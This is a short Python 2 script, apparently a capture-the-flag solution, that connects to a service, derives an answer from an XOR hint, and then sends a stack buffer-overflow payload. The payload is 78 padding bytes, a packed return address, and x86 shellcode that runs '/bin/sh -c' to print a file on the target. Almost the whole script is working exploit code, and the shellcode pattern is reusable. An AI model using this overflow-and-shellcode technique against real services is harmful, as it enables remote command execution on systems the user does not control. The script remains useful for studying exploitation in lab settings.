import socket
import struct
import re

#answer to a fun CTF (I have modified values to not give away any answers but show how it was accomplished.)

xnum = -0x11111115 
host = "vulnhost.com"
port = 91119

ret = struct.pack('<I',0x8049640)

buf =  ""
buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
buf += "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0a"
buf += "\x00\x00\x00\x63\x61\x74\x20\x76\x75\x6c\x6e\x32\x00"
buf += "\x57\x53\x89\xe1\xcd\x80"

junk = "A"*78

payload = junk+ret+buf

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
msg = s.recv(1024)
#print msg so we can see it working.

'''
connection message prints out a number as a hint, reversed binary to discover
that number is the result of XORing a random number with a specific value (xnum).
this block grabs the hint number and calulates the original random number which is the answer.
'''

hint = re.findall(r"\b\d{10}\b", msg)
num = int(hint[0])
answer = num^xnum+2**32
s.send(str(answer)+"\r")
resp = s.recv(1024)
#print resp so we cans see it working.

'''
After correct answer is given we can send payload to trigger buffer overflow and execute
shell code.
'''

s.send(payload)

# print the output of command
cmdOutput = s.recv(1024)
print cmdOutput
